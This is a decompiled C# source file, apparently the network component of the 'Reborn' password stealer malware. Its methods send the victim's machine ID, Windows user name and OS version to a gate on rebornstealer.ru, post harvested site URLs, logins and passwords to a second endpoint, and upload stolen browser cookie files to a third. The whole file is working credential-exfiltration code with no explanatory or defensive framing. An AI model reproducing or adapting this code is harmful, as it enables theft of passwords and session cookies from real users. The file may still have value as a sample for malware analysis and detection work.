using System;
using System.IO;
using System.Net;
using System.Security.Principal;
using System.Text;

namespace Reborn
{
	// Token: 0x02000016 RID: 22
	internal class Network
	{
		// Token: 0x060000AD RID: 173 RVA: 0x000078B8 File Offset: 0x00005AB8
		private static void PostRequest(string url, string parameters)
		{
			byte[] bytes = Encoding.UTF8.GetBytes(parameters);
			WebRequest webRequest = WebRequest.Create(url);
			webRequest.Method = "POST";
			webRequest.ContentLength = (long)bytes.Length;
			webRequest.ContentType = "application/x-www-form-urlencoded";
			using (Stream requestStream = webRequest.GetRequestStream())
			{
				requestStream.Write(bytes, 0, bytes.Length);
				requestStream.Close();
				requestStream.Dispose();
			}
			using (WebResponse response = webRequest.GetResponse())
			{
				using (StreamReader streamReader = new StreamReader(response.GetResponseStream()))
				{
					streamReader.ReadToEnd();
					streamReader.Close();
					streamReader.Dispose();
				}
				response.Close();
			}
		}

		// Token: 0x060000AE RID: 174 RVA: 0x00007998 File Offset: 0x00005B98
		public static void UserRequest()
		{
			Network.PostRequest("https://rebornstealer.ru/gate.php", string.Format("id={0}&cn={1}&os={2}&user={3}&ver={4}", new object[]
			{
				Network.Id,
				WindowsIdentity.GetCurrent().Name.Split(new char[]
				{
					'\\'
				})[1],
				Identification.GetWindowsVersion(),
				Settings.Owner,
				Settings.Version
			}));
		}

		// Token: 0x060000AF RID: 175 RVA: 0x00007A28 File Offset: 0x00005C28
		public static void LogRequest(PassData data)
		{
			Network.PostRequest("https://rebornstealer.ru/loggate.php", string.Format("id={0}&site={1}&program={2}&login={3}&pass={4}&user={5}", new object[]
			{
				Network.Id,
				data.Url,
				data.Program,
				data.Login,
				data.Password,
				Settings.Owner
			}));
		}

		// Token: 0x060000B0 RID: 176 RVA: 0x00007AA0 File Offset: 0x00005CA0
		public static void FileRequest(string program, int row, string filetempPath)
		{
			new WebClient().UploadFile(string.Concat(new object[]
			{
				"https://rebornstealer.ru/cookies/upload.php?id=",
				Network.Id,
				"&type=",
				program,
				"&count=",
				row - 1,
				"&user=",
				Settings.Owner
			}), "POST", filetempPath);
		}

		// Token: 0x04000048 RID: 72
		private static readonly string Id = Identification.GetId();
	}
}
